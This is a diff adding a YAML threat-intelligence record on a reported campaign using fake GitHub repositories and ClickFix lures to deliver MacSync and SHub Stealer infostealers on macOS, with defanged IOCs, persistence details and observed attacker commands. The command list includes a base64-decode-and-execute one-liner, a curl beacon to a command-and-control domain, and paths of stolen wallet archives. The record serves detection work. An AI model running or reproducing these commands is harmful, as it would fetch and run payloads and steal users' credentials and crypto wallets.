@@ -1,0 +1,81 @@
+description: Datadog identified an active campaign using fake GitHub repositories
+  and ClickFix technique to deliver MacSync and SHub Stealer v2.0 infostealers.
+attribution: 'null'
+malware_families: '[''MacSync'', ''SHub Stealer'']'
+TTPs:
+  processes:
+  - GoogleUpdate
+  - curl
+  - bash
+  - osascript
+  - cmd.exe
+  - powershell.exe
+  commandline:
+  - mkdir -p /Users/username/Library/Application Support/Google/
+  - mkdir -p /Users/username/Library/LaunchAgents/
+  - echo"$CODE"|base64-d>/tmp/.c.sh&&chmod+x /tmp/.c.sh&&/tmp/.c.sh;rm-f/tmp/.c.sh
+  - curl -s https://api.ipify.org 2>/dev/null || echo unknown
+  - curl -s -X POST "https://imper-strlk5[.]com/api/bot/heartbeat"
+  - 'echo "GitHub-Appinstaller: https://drive-file-stream/GitHubApplicationSetup.dmg" && curl -O cm i'
+  scripting_engine:
+  - bash
+  - osascript
+  registry_keys:
+  - HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
+  - HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
+  image_load: []
+  network_connections:
+  - GoogleUpdate -> imper-strlk5[.]com:443
+  - curl -> imper-strlk5[.]com:443
+  - powershell.exe, https://io-app-gitgithub.io/, 443
+  file_activity:
+  - /Users/username/Library/Application Support/Google/GoogleUpdate.app/Contents/MacOS/GoogleUpdate
+  - /Users/username/Library/LaunchAgents/com.google.keystone.agent.plist
+  - /tmp/.c.sh
+  - /tmp/osalogging.zip
+  - /tmp/shub_log.zip
+  - /tmp/shub_*
+  - /tmp/exodus_asar.zip
+  - /tmp/atomic_asar.zip
+  - /tmp/ledger_asar.zip
+  - /tmp/ledger_live_asar.zip
+  - /tmp/trezor_asar.zip
+  - /tmp/app.asar
+  persistence:
+  - Fake Google Update binary and LaunchAgent plist for beaconing every 60 seconds
+  - User-level persistence via com.google.keystone.agent.plist
+  process_relations: []
+CVEs: '[]'
+IOCs:
+  hashes:
+  - 9191101893e419eac4be02d416e4eed405ba2055441f36e564f09c19cb26271c
+  ip_addresses: []
+  domains:
+  - imper-strlk5[.]com
+  - securityfenceandwelding[.]com
+  - stobminipinporl[.]com
+  - mini-zmoto[.]com
+  - mubasokurso[.]com
+  - drmcdermottmd[.]com
+  - hci-outdoors[.]com
+  - warboardgame[.]com
+  - tiptopmarine[.]com
+  - skpwresorts[.]com
+  - io-app-gitgithub.io
+  - drive-file-stream.github.com
+  urls:
+  - https://imper-strlk5[.]com/loader.sh?build={BUILD_ID}
+  - https://imper-strlk5[.]com/payload.applescript?build={BUILD_ID}
+  - https://imper-strlk5[.]com/curl/{BUILD_ID}
+  - https://imper-strlk5[.]com/gate
+  - https://script.google[.]com/macros/s/AKfycbwip_VgPEumBXeWuX_OEX6huIMHfPXidiweHpHR-fGUQIqpcR-mAMAHC1JCUQyJne3n0Q/exec
+  - https://pmacos.onelink[.]me/m5yY/q5vbjgvhpwin.onelink[.]me/zmFc/dt38769z
+  - https://io-app-gitgithub.io/.github/
+  - https://drive-file-stream/GitHubApplicationSetup.dmg
+authors:
+- Tyler Reinecke
+- Matt Muir
+- Andy Giron
+reference: https://securitylabs.datadoghq.com/articles/tech-impersonators-clickfix-and-macos-infostealers
+date_of_publication: February 10, 2026
+file_creation_date: February 10, 2026
